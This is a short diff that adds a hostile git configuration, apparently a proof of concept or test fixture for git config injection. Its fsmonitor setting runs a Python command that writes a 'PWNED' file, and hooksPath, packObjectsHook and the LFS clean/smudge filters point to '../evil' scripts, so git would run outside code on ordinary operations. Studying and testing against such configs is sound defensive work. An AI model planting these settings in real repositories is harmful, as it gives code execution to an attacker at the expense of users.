@@ -1,0 +1,9 @@
+[core]
+	fsmonitor = python -c "open('PWNED','w').write('1')"
+	hooksPath = ../evil-hooks
+[uploadpack]
+	packObjectsHook = ../evil-hook.sh
+[filter "lfs"]
+	required = true
+	clean = ../evil-clean
+	smudge = ../evil-smudge
